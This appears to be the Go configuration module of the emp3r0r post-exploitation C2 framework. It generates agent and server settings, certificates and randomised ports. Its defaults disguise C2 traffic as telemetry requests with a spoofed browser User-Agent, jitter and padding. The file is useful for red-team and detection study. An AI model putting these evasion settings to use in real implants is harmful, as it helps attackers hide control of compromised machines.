package config

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// SaveConfigJSON save runtime config to emp3r0r.json
func SaveConfigJSON() (err error) {
	// Use shadow struct for JSON serialization to keep strings out of shared def package
	jCfg := jsonConfig{
		CCAddress:                 live.RuntimeConfig.CCAddress,
		CCHost:                    live.RuntimeConfig.CCHost,
		CCPort:                    live.RuntimeConfig.CCH2Port,
		AgentSocksServerPort:      live.RuntimeConfig.AgentSocksServerPort,
		AgentSocksTimeout:         live.RuntimeConfig.AgentSocksTimeout,
		StagerHTTPListenerPort:    live.RuntimeConfig.StagerHTTPListenerPort,
		Password:                  live.RuntimeConfig.Password,
		ShadowsocksLocalSocksPort: live.RuntimeConfig.ShadowsocksLocalSocksPort,
		ShadowsocksServerPort:     live.RuntimeConfig.ShadowsocksServerPort,
		KCPServerPort:             live.RuntimeConfig.P2PRelayPort,
		KCPClientPort:             live.RuntimeConfig.KCPClientPort,
		UseKCP:                    live.RuntimeConfig.UseKCP,
		EnableNCSI:                live.RuntimeConfig.EnableNCSI,
		SSHHostKey:                string(live.RuntimeConfig.SSHHostKey),
		SSHDShellPort:             live.RuntimeConfig.SSHDShellPort,
		MeshGossipPort:            live.RuntimeConfig.MeshGossipPort,
		PreflightEnabled:          live.RuntimeConfig.PreflightEnabled,
		PreflightURL:              live.RuntimeConfig.PreflightURL,
		PreflightMethod:           live.RuntimeConfig.PreflightMethod,
		PreflightHeaders:          live.RuntimeConfig.PreflightHeaders,
		PreflightIntervalMin:      live.RuntimeConfig.PreflightIntervalMin,
		PreflightIntervalMax:      live.RuntimeConfig.PreflightIntervalMax,
		CAPEM:                     live.RuntimeConfig.CAPEM,
		CAFingerprint:             live.RuntimeConfig.CAFingerprint,
		C2TransportProxy:          live.RuntimeConfig.C2TransportProxy,
		CDNProxy:                  live.RuntimeConfig.CDNProxy,
		DoHServer:                 live.RuntimeConfig.DoHServer,
		AgentUUID:                 live.RuntimeConfig.AgentUUID,
		AgentUUIDSig:              live.RuntimeConfig.AgentUUIDSig,
		AgentTag:                  live.RuntimeConfig.AgentTag,
		CCTimeout:                 live.RuntimeConfig.CCTimeout,
		PaddingMin:                live.RuntimeConfig.PaddingMin,
		PaddingMax:                live.RuntimeConfig.PaddingMax,
		Jitter:                    live.RuntimeConfig.Jitter,
		PollInterval:              live.RuntimeConfig.PollInterval,
		ModulePath:                live.RuntimeConfig.ModulePath,
		IsRunByStager:             live.RuntimeConfig.IsRunByStager,
		MachineID:                 live.RuntimeConfig.MachineID,
		InitialPeers:              live.RuntimeConfig.InitialPeers,
		IsP2PEnabled:              live.RuntimeConfig.IsP2PEnabled,
		IsDirectC2Enabled:         live.RuntimeConfig.IsDirectC2Enabled,
		PersistentRouter:          live.RuntimeConfig.PersistentRouter,
		P2PTransport:              live.RuntimeConfig.P2PTransport,
		CamouflageCertOrg:         live.RuntimeConfig.CamouflageCertOrg,
		CamouflageCertCN:          live.RuntimeConfig.CamouflageCertCN,
		C2ChannelMode:             live.RuntimeConfig.C2ChannelMode,
		CCHTTPPort:                live.RuntimeConfig.CCHTTPPort,
		C2Routes: jsonC2Routing{
			Checkin: live.RuntimeConfig.C2Routes.Checkin,
			Msg:     live.RuntimeConfig.C2Routes.Msg,
			FTP:     live.RuntimeConfig.C2Routes.FTP,
			WWW:     live.RuntimeConfig.C2Routes.WWW,
			Proxy:   live.RuntimeConfig.C2Routes.Proxy,
		},
		MalleableC2: jsonMalleableHTTPConfig{
			C2Path:        live.RuntimeConfig.MalleableC2.C2Path,
			SessionHeader: live.RuntimeConfig.MalleableC2.SessionHeader,
			SessionValue:  live.RuntimeConfig.MalleableC2.SessionValue,
			InitHeader:    live.RuntimeConfig.MalleableC2.InitHeader,
			InitValue:     live.RuntimeConfig.MalleableC2.InitValue,
			CloseHeader:   live.RuntimeConfig.MalleableC2.CloseHeader,
			CloseValue:    live.RuntimeConfig.MalleableC2.CloseValue,
			CustomHeaders: live.RuntimeConfig.MalleableC2.CustomHeaders,
		},
	}

	w_data, err := json.MarshalIndent(jCfg, "", "  ")
	if err != nil {
		return fmt.Errorf("saving %s: %v", live.EmpConfigFile, err)
	}

	return os.WriteFile(live.EmpConfigFile, w_data, 0o600)
}

// InitConfigFile generate a new emp3r0r.json
func InitConfigFile(cc_host string) (err error) {
	// C2 service ports
	if live.RuntimeConfig.CCH2Port == "0" {
		live.RuntimeConfig.CCH2Port = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	}
	if live.RuntimeConfig.CCHTTPPort == "0" {
		live.RuntimeConfig.CCHTTPPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	}

	// randomize other ports
	live.RuntimeConfig.CCAddress = cc_host
	live.RuntimeConfig.CCHost = cc_host
	live.RuntimeConfig.AgentSocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.MeshGossipPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.SSHDShellPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.ShadowsocksLocalSocksPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.ShadowsocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.P2PRelayPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.KCPClientPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.StagerHTTPListenerPort = fmt.Sprintf("%v", util.RandInt(1026, 65534))
	live.RuntimeConfig.CCTimeout = util.RandInt(10000, 20000)
	live.RuntimeConfig.C2ChannelMode = def.C2ChannelModeDefault
	live.RuntimeConfig.C2Routes.Checkin = "c2-" + strings.ToLower(util.RandStr(12))
	live.RuntimeConfig.C2Routes.Msg = "c2-" + strings.ToLower(util.RandStr(12))
	live.RuntimeConfig.C2Routes.FTP = "c2-" + strings.ToLower(util.RandStr(12))
	live.RuntimeConfig.C2Routes.WWW = "c2-" + strings.ToLower(util.RandStr(12))
	live.RuntimeConfig.C2Routes.Proxy = "c2-" + strings.ToLower(util.RandStr(12))

	// SSH host key
	live.RuntimeConfig.SSHHostKey, _, err = transport.GenerateSSHKeyPair()
	if err != nil {
		return fmt.Errorf("failed to generate SSH host key: %v", err)
	}

	live.RuntimeConfig.AgentUUID = uuid.NewString()
	live.RuntimeConfig.Password = util.RandStr(20)

	// time intervals

	// Preflight default
	live.RuntimeConfig.PreflightEnabled = true
	if live.RuntimeConfig.PreflightURL == "" {
		live.RuntimeConfig.PreflightURL = fmt.Sprintf("http://%s/%s", cc_host, util.RandStr(util.RandInt(5, 10)))
	}
	live.RuntimeConfig.PreflightMethod = "POST"
	live.RuntimeConfig.AgentSocksTimeout = 0 // disable timeout by default, leave it to the OS

	// sign agent UUID
	// CA
	err = transport.LoadCACrt()
	if err != nil {
		return fmt.Errorf("failed to load CA: %v", err)
	}
	live.RuntimeConfig.CAPEM = string(transport.CACrtPEM)
	live.RuntimeConfig.CAFingerprint = transport.GetFingerprint(transport.CaCrtFile)
	// sign
	sig, err := transport.SignWithCAKey([]byte(live.RuntimeConfig.AgentUUID))
	if err != nil {
		return fmt.Errorf("failed to sign agent UUID: %v", err)
	}
	live.RuntimeConfig.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
	live.RuntimeConfig.AgentTag = live.RuntimeConfig.AgentUUID

	if live.RuntimeConfig.PaddingMin == 0 {
		live.RuntimeConfig.PaddingMin = 1024
	}
	if live.RuntimeConfig.PaddingMax == 0 {
		live.RuntimeConfig.PaddingMax = 10240
	}
	if live.RuntimeConfig.Jitter == 0 {
		live.RuntimeConfig.Jitter = 20
	}
	if live.RuntimeConfig.PollInterval == 0 {
		live.RuntimeConfig.PollInterval = 60
	}

	// Malleable C2 Defaults
	live.RuntimeConfig.MalleableC2.C2Path = "/api/v1/telemetry"
	live.RuntimeConfig.MalleableC2.SessionHeader = "Cookie"
	live.RuntimeConfig.MalleableC2.SessionValue = "sessionID=%s"
	live.RuntimeConfig.MalleableC2.InitHeader = "Cookie"
	live.RuntimeConfig.MalleableC2.InitValue = "init=1"
	live.RuntimeConfig.MalleableC2.CloseHeader = "Cookie"
	live.RuntimeConfig.MalleableC2.CloseValue = "close=1"
	live.RuntimeConfig.MalleableC2.CustomHeaders = map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}

	// save
	return SaveConfigJSON()
}

// LoadCACrt2RuntimeConfig CA cert to runtime config
func LoadCACrt2RuntimeConfig() error {
	err := transport.LoadCACrt()
	if err != nil {
		return err
	}
	live.RuntimeConfig.CAPEM = string(transport.CACrtPEM)
	live.RuntimeConfig.CAFingerprint = transport.GetFingerprint(transport.CaCrtFile)
	return nil
}

func ReadJSONConfig(jsonData []byte, config_to_write *def.Config) error {
	if jsonData == nil {
		// read JSON
		var err error
		jsonData, err = os.ReadFile(live.EmpConfigFile)
		if err != nil {
			return err
		}
	}
	if config_to_write == nil {
		config_to_write = live.RuntimeConfig
	}

	return readJSONConfig(jsonData, config_to_write)
}

// InitCertsAndConfig generate certs if not found, then generate config file
func InitCertsAndConfig() error {
	// if we are not running as server, return, the certs are already generated
	if !live.IsServer {
		return nil
	}

	if _, err := os.Stat(transport.CaCrtFile); os.IsNotExist(err) {
		logging.Warningf("CA cert not found, generating a new one")
		_, err := transport.GenCerts(nil, transport.CaCrtFile, transport.CaKeyFile, "", "", true)
		if err != nil {
			return fmt.Errorf("GenCerts: %v", err)
		}
	}

	// generate mTLS cert for operator
	if _, err := os.Stat(transport.OperatorCaCrtFile); os.IsNotExist(err) {
		logging.Warningf("mTLS cert not found, generating a new one")
		// CA cert
		_, err := transport.GenCerts(nil, transport.OperatorCaCrtFile, transport.OperatorCaKeyFile, "", "", true)
		if err != nil {
			return fmt.Errorf("generating operator CA: %v", err)
		}

		// client cert signed by CA
		_, err = transport.GenCerts(nil, transport.OperatorClientCrtFile, transport.OperatorClientKeyFile, transport.OperatorCaKeyFile, transport.OperatorCaCrtFile, false)
		if err != nil {
			return fmt.Errorf("generating operator cert: %v", err)
		}
	}

	return nil
}

func GenC2Certs(hosts_str string) error {
	// generate C2 TLS cert for given host names
	var hosts []string
	hosts = strings.Fields(hosts_str)

	// Check if certs exist
	if util.IsFileExist(transport.ServerCrtFile) && util.IsFileExist(transport.ServerKeyFile) &&
		util.IsFileExist(transport.OperatorServerCrtFile) && util.IsFileExist(transport.OperatorServerKeyFile) {
		logging.Infof("C2 certs already exist, skipping generation")
		return nil
	}

	// if C2 server TLS cert not found, generate new ones
	logging.Warningf("C2 TLS cert not found, generating a new one")
	hosts = append(hosts, def.Localhost) // sometimes we need to connect to a relay that listens on localhost
	hosts = append(hosts, "localhost")   // sometimes we need to connect to a relay that listens on localhost

	// validate host names
	for _, host := range hosts {
		if !netutil.ValidateHostName(host) {
			return fmt.Errorf("invalid host name: %s", host)
		}
	}

	// generate C2 TLS cert
	_, certErr := transport.GenCerts(hosts, transport.ServerCrtFile, transport.ServerKeyFile, transport.CaKeyFile, transport.CaCrtFile, false)
	if certErr != nil {
		return fmt.Errorf("generating C2 TLS cert: %v", certErr)
	}
	// generate operator mTLS cert
	hosts = append(hosts, netutil.WgServerIP)   // add wireguard IP for operator
	hosts = append(hosts, netutil.WgOperatorIP) // add wireguard IP for operator
	_, certErr = transport.GenCerts(hosts, transport.OperatorServerCrtFile, transport.OperatorServerKeyFile, transport.OperatorCaKeyFile, transport.OperatorCaCrtFile, false)
	if certErr != nil {
		return fmt.Errorf("generating operator cert: %v", certErr)
	}

	return nil
}

// LoadConfig load config JSON file
func LoadConfig() error {
	err := LoadCACrt2RuntimeConfig()
	if err != nil {
		return fmt.Errorf("failed to load CA to RuntimeConfig: %v", err)
	}

	if util.IsFileExist(live.EmpConfigFile) {
		return ReadJSONConfig(nil, nil)
	}
	// init config file using the first host name
	return InitConfigFile(def.Localhost)
}
